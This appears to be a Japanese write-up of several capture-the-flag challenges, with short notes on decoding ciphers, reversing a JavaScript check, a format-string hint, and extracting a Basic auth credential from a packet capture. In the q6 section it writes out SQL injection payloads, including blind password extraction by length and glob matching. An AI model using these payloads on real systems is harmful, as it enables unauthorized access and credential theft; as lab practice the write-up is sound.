### q1
テスト、入れるだけ

### q2
シーザー暗号、試しにpythonのrot13で複合したらあっさり

### q3
ソースをみるとscriptの中にニャル子さんが。
エラー吐いてないのでjsとして動作するっぽい、まじ？
とりあえずコピペして手元に保存、
```javascript
> node unya.js

$(function () {
  $("form").submit(function () {
    var t = $('input[type="text"]').val();
    var p = Array(70, 152, 195, 284, 475, 612, 791, 896, 810, 850, 737, 1332, 1469, 1120, 1470, 832, 1785, 2196, 1520, 1480, 1449);
    var f = false;
    if (p.length == t.length) {
      f = true;
      for (var i = 0; i < p.length; i++)
        if (t.charCodeAt(i) * (i + 1) != p[i]) f = false;
      if (f) alert("(」・ω・)」うー!(/・ω・)/にゃー!");
    }
    if (!f) alert("No");
    return false;
  });
}); 
``` 
おお、でた。うーにゃーの実態。
あとは`Array(70, 152,...`に対して逆の変換をしてやれば良さそう

### q4
sshすると`flag.txt`と実行ファイルあと`readme`  

```
What s your name?
taso
Hi, taso

Do you want the flag?
hoge
Do you want the flag?
yea
Do you want the flag?
hi
Do you want the flag?
aaaa
Do you want the flag?
yes
Do you want the flag?
YES
Do you want the flag?
no
I see. Good bye.
```
この環境一通りコマンドが使えないｗ
`anjdump`は使えたので素直に逆アセンブリ

`Hi, <name>`を表示していると推測できる部分にprintf, printf putchar
標準出力が３つ、`c言語 printf 複数 脆弱性` でググるといい感じの記事がヒット
![http://rkx1209.hatenablog.com/entry/20120113/1326471755](http://rkx1209.hatenablog.com/entry/20120113/1326471755)

### q5
とりあえずbase64エンコード、
```
echo q4 | nkf -d --base64
```
まだ暗号化されてるっぽい、というかタイトルがonionなるほどと思い数回デコード、５、６回？
```python

>>> dec = dec.decode('base64')
>>> dec
'begin 666 <data>\n51DQ!1U]&94QG4#-3:4%797I74$AU\n \nend\n'
```
uuencodeっぽい文字列が出現。ビンゴ

```python
>>> print dec.decode('uu')
```

### q6
`' or 1=1 -- '`
であっさりなんか出た 

```
Congratulations!
It's too easy?
Don't worry.
The flag is admins password.

Hint:
<?php...
```
曰くパスワードがフラグらしい。ついでにソースコードも見せてくれた  
sqliteかーと思ってありそうなdbファイル名を試すもヒットせず。  
  
特に禁止文字もないしsql書き放題なんで  
`' or 1=1 and length(pass) >= 20 -- '`
みたいな感じで文字数を絞っていく。いい感じに文字数取得。  
`' or 1=1 and pass glob 'FLAG_a*' --'`
パスワードがフラグって言っているので記号は含まれていないはず、という前提で適当に絞り込んでいく  
ここら辺で辛くなってきたのでコード書いた
![brute_force.py](https://github.com/YuiOmata/ctf/blob/master/ksnctf/q6/brute_force.py)  

### q8
リンクがあるので脳死してクリック、表示がやばい
URLみたらpcapって書いてあったのでlocalに落としてwiresharkで表示した

basic is secure?なんでBasic認証してる通信がありそう→http 401発見
200の直前の通信をみると`Ausentication: XXXXX`
wiresharkが勝手にdecodeしてくれているのでタブを開くとフラグ出現





